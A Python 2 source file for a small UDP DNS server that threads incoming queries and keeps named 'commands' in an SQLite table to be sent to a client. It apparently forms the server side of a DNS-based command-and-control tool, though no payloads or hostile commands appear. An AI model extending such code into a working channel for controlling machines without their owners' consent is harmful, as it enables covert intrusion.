"""
    File containing classes and functions to create
    the DNS server and handle queries/repsonses
    @author Dosh, JRoc
"""
import socket, threading, sys, sqlite3
import query

"""
    Class to represent the base of the DNS server

    port - the port number to bind to
"""
class Server:
    def __init__(self, port):
        self.port= port
        self.sock = None
        self.db = None

    """
        Function to start the server with the information
        in the server

    """
    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.bind(('', self.port))
        #self.db = sqlite3.connect('sandtomb.db')
        #self.db.execute('''CREATE TABLE IF NOT EXISTS commands
         #                   (name TEXT, cmd TEXT)''')
        while True:
            #Accept query and start a new thread
            q, addr = self.sock.recvfrom(8192)
            query_handler = threading.Thread(target=query.handle_query, args=(q, addr, self))
            query_handler.daemon=True
            try:
                query_handler.start()
            except (KeyboardInterrupt, SystemExit):
                self.sock.close()
                sys.exit()

    """
        Function to add a new command to the servers database
        that the user can later load to send to client

        name - the variable name of the command
        cmd - the command to be sent to the client
    """
    def add_command(self, name, cmd, db):
        c = db.cursor()
        c.execute("INSERT INTO commands VALUES (?, ?)", (name, cmd))
        db.commit()
    

    """
        Function to load a command into the server that the user made
        or a prepared command

        name - the name of the command to load
    """
    def load_command(self, name, db):
        c = db.cursor()
        c.execute("SELECT cmd from commands WHERE name=?", (name,))
        cmd = c.fetchall()
        print cmd
